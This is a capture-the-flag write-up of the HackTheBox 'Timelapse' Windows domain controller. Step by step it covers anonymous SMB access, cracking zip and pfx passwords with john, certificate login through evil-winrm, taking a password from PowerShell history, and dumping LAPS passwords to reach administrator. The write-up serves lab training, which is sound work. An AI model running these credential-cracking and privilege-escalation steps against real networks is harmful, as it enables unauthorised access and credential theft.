---
layout: single
date: 2022-08-04
title: "HackTheBox Timelapse"
header:
    overlay_image: /assets/images/htb.png
    caption: "[__HackTheBox__](https://www.hackthebox.com/achievement/machine/99813/452)"
related: true
comments: true
---

Hello!, and welcome to my HackTheBox Write-Ups!

# Timelapse
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/Timelapse.png" alt="Timelapse banner">

## Description:
This is a windows box and categorized as easy. Before going through the writeup, please try from your side first.


## Initial enumeration
`nmap` enumeration for top 1000 ports.

```bash
nmap -sC -sV -oA nmap/initial 10.10.11.152 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 17:20 EDT
Nmap scan report for 10.10.11.152
Host is up (0.25s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-08-04 05:20:38Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m59s
| smb2-time: 
|   date: 2022-08-04T05:20:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.28 seconds
```

From the nmap result we can say that it's a domain controller. Let's start our enumeration from smb services.

```bash
smbclient -N -L  \\\\10.10.11.152
```
Looking into the result, `Shares` share looks interesting. Let's connect with NULL session authentication.

```bash
smbclient -N  \\\\10.10.11.152\\Shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
```

There are two directories inside `Shares`. Let's look into `Dev`. There is a `winrm_backup.zip` file. Let's download the file locally.

```powershell
smb: \dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

smb: \dev\> get winrm_backup.zip
```

It's a password protected zip file. Let's use `zip2john` to get a hash so that we can crack the password.
```bash
zip2john winrm_backup.zip > winrm.hash
```
Let's try to bruteforce the hash with `john`.
```bash
john -w=/usr/share/wordlists/rockyou.txt winrm.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!zip_password!!    (winrm_backup.zip/legacyy_dev_auth.pfx)
```
## Initial foothold

And `john` successfully cracked the hash. Let's unzip the file with password. There is a `legacyy_dev_auth.pfx` in it. The name of the zip file hints that this must be related to `winrm` authentication. To authenticate through `winrm` we need the private key and the certificate. Let's use `openssl` to extract both from the `pfx` file. Before that we need password for the `pfx` file.

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
```
```bash
john -w=/usr/share/wordlists/rockyou.txt pfx.hashjohn pfx.hash
```
```bash
john pfx.hash --show                                                                

legacyy_dev_auth.pfx:!!pfx_password!!:::::legacyy_dev_auth.pfx
```
Now let's generate the private key and the certificate.
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
Enter Import Password:
```
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem 
Enter Import Password:
```

Now try to connect to the box using `evil-winrm`.
```powershell
evil-winrm -i 10.10.11.152 -S -k priv-key.pem -c certificate.pem                      

Evil-WinRM shell v3.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```
We got shell into the box as `legacyy`, and we can grab the user flag from the `Desktop` folder of `legacyy`.

## User enumeration
```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.
```
`svc_deploy` looks interesting. Let's check its privileges.
```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/3/2022 10:38:58 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
We can see that `svc_deploy` is part of `LAPS_Readers`. If we can get shell as `svc_deploy`, then we can read `laps` password. We will use `winpeas.exe` for enumeration. Get the `winpeas` executable into the box and run it.

#### winpeas enumeration
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/timelapse01.png" alt="winpeas result">

`winpeas` found the powershell history. Let's look into it.

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString '!!svc_deploy_password!!' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
We can see the clear text password for the account `svc_deploy`. Let's connect to it using `evil-winrm`.

```powershell
evil-winrm -i 10.10.11.152 -S -u svc_deploy -p '!!svc_deploy_password!!'

Evil-WinRM shell v3.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```
Now we have shell as `svc_deploy`. We will use [Get-LAPSPasswords.ps1](https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1) to dump the `laps` password. Get the script into the box and run it.

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Import-Module .\Get-LAPSPasswords.ps1
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords


Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : !!laps_password!!
Expiration : 8/8/2022 5:39:07 AM

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : !!laps_password!!
Expiration : 8/8/2022 5:39:07 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : !!laps_password!!
Expiration : 8/8/2022 5:39:07 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : !!laps_password!!
Expiration : 8/8/2022 5:39:07 AM

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA

Hostname   :
Stored     : 0
Readable   : 0
Password   :
Expiration : NA
```
We got the password. Let's try to connect to the box as `administrator` with the `password` using `evil-winrm`.

```powershell
evil-winrm -i 10.10.11.152 -S -u administrator -p '!!laps_password!!'

Evil-WinRM shell v3.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
Now we are `administrator`. Get the `root` hash form TRX Desktop.

```powershell
*Evil-WinRM* PS C:\Users> dir TRX\Desktop


  Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         8/3/2022   5:39 AM             34 root.txt



```

### Think Out Of The Box!!